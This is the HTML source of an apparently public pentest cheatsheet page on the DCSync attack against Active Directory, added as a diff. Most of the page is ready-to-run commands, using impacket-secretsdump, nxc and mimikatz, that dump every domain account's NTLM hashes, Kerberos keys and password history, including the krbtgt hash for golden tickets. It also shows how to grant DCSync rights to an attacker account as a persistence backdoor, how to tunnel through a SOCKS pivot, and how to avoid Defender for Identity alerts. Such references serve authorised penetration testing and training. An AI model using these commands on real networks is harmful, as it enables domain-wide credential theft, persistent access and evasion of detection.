@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DCSync | JinPwn</title><meta name="description" content="The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&amp;rsquo;s credential material to you. No code execution on the DC needed.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/">
+<meta property="og:title" content="DCSync | JinPwn">
+<meta property="og:description" content="The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&amp;rsquo;s credential material to you. No code execution on the DC needed.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="DCSync | JinPwn">
+<meta name="twitter:description" content="The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&amp;rsquo;s credential material to you. No code execution on the DC needed.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account\u0026rsquo;s credential material to you. No code execution on the DC needed.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"DCSync | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link is-current">DCSync</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>DCSync</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">DCSync</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Active Directory Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link is-current">DCSync</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&rsquo;s credential material to you. No code execution on the DC needed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
+</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
+</span></span></code></pre></div><h2 id="i-who-has-dcsync-rights-by-default" data-heading-permalink="true"><span class="heading-content">i. Who has DCSync rights by default</span>
+    <a class="heading-permalink" href="#i-who-has-dcsync-rights-by-default" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>These groups have the <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code> extended rights on the domain object:</p>
+<ul>
+<li><strong>Domain Admins</strong></li>
+<li><strong>Enterprise Admins</strong></li>
+<li><strong>Administrators (BUILTIN)</strong></li>
+<li><strong>Domain Controllers</strong></li>
+<li><strong>Read-only Domain Controllers</strong> (partial)</li>
+<li><strong>Account Operators</strong> (no, but Read-only via specific ACLs in some configs)</li>
+<li><strong>Any account explicitly delegated the right</strong> (Exchange installs, monitoring tools, third-party syncs)</li>
+</ul>
+<h2 id="ii-find-dcsync-capable-principals" data-heading-permalink="true"><span class="heading-content">ii. Find DCSync-capable principals</span>
+    <a class="heading-permalink" href="#ii-find-dcsync-capable-principals" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>BloodHound query:</p>
+<pre tabindex="0"><code class="language-cypher" data-lang="cypher">MATCH p=(u)-[r:GetChanges|GetChangesAll|DCSync]-&gt;(d:Domain)
+RETURN u.name, d.name
+</code></pre><p>bloodyAD LDAP query (looks at domain ACEs for the two extended rights):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Show the domain object&#39;s ACL, look for the GetChanges* rights:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object <span class="s2">&#34;DC=corp,DC=local&#34;</span> --resolve-sd
+</span></span></code></pre></div><p>nxc check:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M daclread -o <span class="nv">TARGET</span><span class="o">=</span><span class="s1">&#39;Domain Admins&#39;</span>
+</span></span></code></pre></div><h2 id="iii-full-dcsync---dump-everything" data-heading-permalink="true"><span class="heading-content">iii. Full DCSync - dump everything</span>
+    <a class="heading-permalink" href="#iii-full-dcsync---dump-everything" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Pull every account&rsquo;s NTLM hash, Kerberos keys, password history:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump <span class="nv">$DOMAIN</span>/Administrator:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## With hash:</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -hashes :<span class="nv">$NTHASH</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## With Kerberos:</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -k -no-pass <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$DC</span>
+</span></span></code></pre></div><p>Output:</p>
+<ul>
+<li><code>*.local</code> file with all NTLM hashes (<code>user:RID:LM:NTLM:::</code>)</li>
+<li><code>.cleartext</code> file with anything in cleartext (LSA secrets, etc)</li>
+<li><code>.kerberos</code> file with AES keys</li>
+</ul>
+<p>Pipe to specific files:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump <span class="nv">$DOMAIN</span>/Administrator:<span class="nv">$PASS</span>@<span class="nv">$DC</span> -outputfile dump
+</span></span><span class="line"><span class="cl"><span class="c1">## dump.ntds = NTLM hashes</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## dump.ntds.kerberos = AES keys</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## dump.ntds.cleartext = anything in cleartext</span>
+</span></span></code></pre></div><h2 id="iv-targeted-dcsync---just-specific-accounts" data-heading-permalink="true"><span class="heading-content">iv. Targeted DCSync - just specific accounts</span>
+    <a class="heading-permalink" href="#iv-targeted-dcsync---just-specific-accounts" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you only need a specific user (less noisy, smaller output):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -just-dc-user Administrator <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -just-dc-user krbtgt <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -just-dc-user <span class="s1">&#39;CORP\Administrator&#39;</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Multiple users at once not supported, run per-user</span>
+</span></span></code></pre></div><p>The krbtgt hash is the goal for <a href="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">Persistence</a>
+ golden tickets. Always pull it once you have DCSync.</p>
+<h2 id="v-only-ntlm-hashes-skip-kerberos-keys-skip-history" data-heading-permalink="true"><span class="heading-content">v. Only NTLM hashes (skip Kerberos keys, skip history)</span>
+    <a class="heading-permalink" href="#v-only-ntlm-hashes-skip-kerberos-keys-skip-history" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Fastest, smallest output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -just-dc-ntlm <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span></code></pre></div><h2 id="vi-include-password-history-for-password-reuse-analysis" data-heading-permalink="true"><span class="heading-content">vi. Include password history (for password reuse analysis)</span>
+    <a class="heading-permalink" href="#vi-include-password-history-for-password-reuse-analysis" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -history <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span></code></pre></div><p>Output includes <code>_history0</code>, <code>_history1</code>, etc per user. Useful for cracking old hashes that may still work elsewhere, or for predicting next password.</p>
+<h2 id="vii-nxc-one-shot-dcsync" data-heading-permalink="true"><span class="heading-content">vii. nxc one-shot DCSync</span>
+    <a class="heading-permalink" href="#vii-nxc-one-shot-dcsync" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --ntds
+</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --ntds --user Administrator
+</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span> --ntds
+</span></span></code></pre></div><p>Behind the scenes uses secretsdump but stores results in nxc&rsquo;s database for cross-host reuse.</p>
+<h2 id="viii-mimikatz-dcsync-from-windows" data-heading-permalink="true"><span class="heading-content">viii. Mimikatz DCSync (from Windows)</span>
+    <a class="heading-permalink" href="#viii-mimikatz-dcsync-from-windows" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">mimikatz # privilege::debug
+</span></span><span class="line"><span class="cl">mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
+</span></span><span class="line"><span class="cl">mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+</span></span><span class="line"><span class="cl">mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+</span></span></code></pre></div><p>Output for golden ticket use:</p>
+<pre tabindex="0"><code>Object RDN           : krbtgt
+** SAM ACCOUNT **
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+...
+Credentials:
+  Hash NTLM: 0123456789abcdef0123456789abcdef         &lt;-- krbtgt NT hash
+  ntlm-0:   0123456789abcdef0123456789abcdef
+* Primary:Kerberos-Newer-Keys *
+  Default Salt: CORP.LOCALkrbtgt
+  Default Iterations: 4096
+  Credentials:
+    aes256_hmac (4096): abcdef...                     &lt;-- AES256 key (preferred for diamond tickets)
+    aes128_hmac (4096): ...
+    des_cbc_md5 (4096): ...
+</code></pre><h2 id="ix-granting-dcsync-to-a-controlled-account" data-heading-permalink="true"><span class="heading-content">ix. Granting DCSync to a controlled account</span>
+    <a class="heading-permalink" href="#ix-granting-dcsync-to-a-controlled-account" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You&rsquo;re DA temporarily (token theft, kerberos abuse) and you want long-term access. Grant DCSync to a non-privileged user, lose nothing if your DA access is revoked:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add dcsync svc_user
+</span></span><span class="line"><span class="cl"><span class="c1">## Now svc_user can DCSync anytime</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add dcsync attacker
+</span></span></code></pre></div><p>Cleanup:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> remove dcsync svc_user
+</span></span></code></pre></div><p>This is the cleanest persistence backdoor short of forging tickets, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">Persistence</a>
+.</p>
+<h2 id="x-dcsync-through-a-socks-pivot" data-heading-permalink="true"><span class="heading-content">x. DCSync through a SOCKS pivot</span>
+    <a class="heading-permalink" href="#x-dcsync-through-a-socks-pivot" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You compromised an internal host and reached the DC through a SOCKS tunnel:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains -q impacket-secretsdump -just-dc-user krbtgt <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span></code></pre></div><p>Make sure FQDN of the DC resolves (or use <code>-dc-ip</code>). The DRSUAPI traffic runs over RPC on dynamic high ports, which proxychains handles fine for TCP.</p>
+<h2 id="xi-dcsync-requirements-you-need-to-know" data-heading-permalink="true"><span class="heading-content">xi. DCSync requirements you need to know</span>
+    <a class="heading-permalink" href="#xi-dcsync-requirements-you-need-to-know" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>DCSync calls DRSUAPI&rsquo;s <code>GetNCChanges</code>. The DC validates:</p>
+<ul>
+<li>Caller has <code>DS-Replication-Get-Changes</code> AND <code>DS-Replication-Get-Changes-All</code> on the NC head (the domain object)</li>
+<li>Caller is either a DC machine account, or a user/group explicitly granted the rights</li>
+</ul>
+<p><code>DS-Replication-Get-Changes-In-Filtered-Set</code> is an additional right for some filtered attributes but not strictly needed for hash dumps.</p>
+<p>When DCSync fails with <code>STATUS_ACCESS_DENIED</code>, you don&rsquo;t have the rights. Recheck the ACE list:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object <span class="s2">&#34;DC=corp,DC=local&#34;</span> --resolve-sd
+</span></span></code></pre></div><h2 id="xii-read-only-domain-controllers-rodc" data-heading-permalink="true"><span class="heading-content">xii. Read-Only Domain Controllers (RODC)</span>
+    <a class="heading-permalink" href="#xii-read-only-domain-controllers-rodc" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>RODCs only replicate the credentials of accounts in the &ldquo;Password Replication Policy&rdquo; allowed list. You can DCSync against an RODC and get only those creds.</p>
+<p>When the RODC machine account is in <code>Allowed RODC Password Replication Group</code>, you can DCSync its own krbtgt and forge &ldquo;RODC Golden Tickets&rdquo; that work against the RODC but not the writable DC.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$RODC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M rdcheck                  <span class="c1">## list cached accounts</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -just-dc-user <span class="s1">&#39;krbtgt_RODC&#39;</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$RODC</span>
+</span></span></code></pre></div><h2 id="xiii-opsec" data-heading-permalink="true"><span class="heading-content">xiii. OPSEC</span>
+    <a class="heading-permalink" href="#xiii-opsec" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>DCSync generates:</p>
+<ul>
+<li><strong>Event 4662</strong> on the DC: directory service access, with the GUID of the replication right</li>
+<li>Often flagged by ATP/Defender for Identity as a high-severity alert</li>
+</ul>
+<p>The DC event has the source IP. On real engagements:</p>
+<ul>
+<li>Do it once, dump everything, exit fast</li>
+<li>Use the DC&rsquo;s machine account itself if possible (less anomalous than a user account)</li>
+<li>Skip DCSync if AD ATP / MDI is in play, use NTDS.dit VSS snapshot (less alerting) - see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/">Credential Dumping</a>
+ section ii</li>
+</ul>
+<h2 id="xiv-after-dcsync" data-heading-permalink="true"><span class="heading-content">xiv. After DCSync</span>
+    <a class="heading-permalink" href="#xiv-after-dcsync" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You have every NTLM hash in the domain. Next steps:</p>
+<ul>
+<li>Crack the highest-value accounts (DA, EA, important service accounts), see <a href="https://jinpwn.dev/cheatsheets/misc/password-cracking/">Password Cracking</a>
+</li>
+<li>PtH to any host with the krbtgt or admin hash, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/">Lateral Movement</a>
+</li>
+<li>Forge golden tickets for persistence, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">Persistence</a>
+</li>
+<li>Re-collect BloodHound - every account is now &ldquo;owned&rdquo;</li>
+</ul>
+<div class="obsidian-callout callout-tip">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">The cracked password is gold</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Even with NTLM, getting the actual cleartext often unlocks more (encrypted backups, app logins, SaaS, VPN). Always try to crack DA passwords even when PtH works.</p>
+  </div>
+</div>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad11-credential-dumping/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Credential Dumping</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad13-trust-attacks/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">Trust Attacks</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
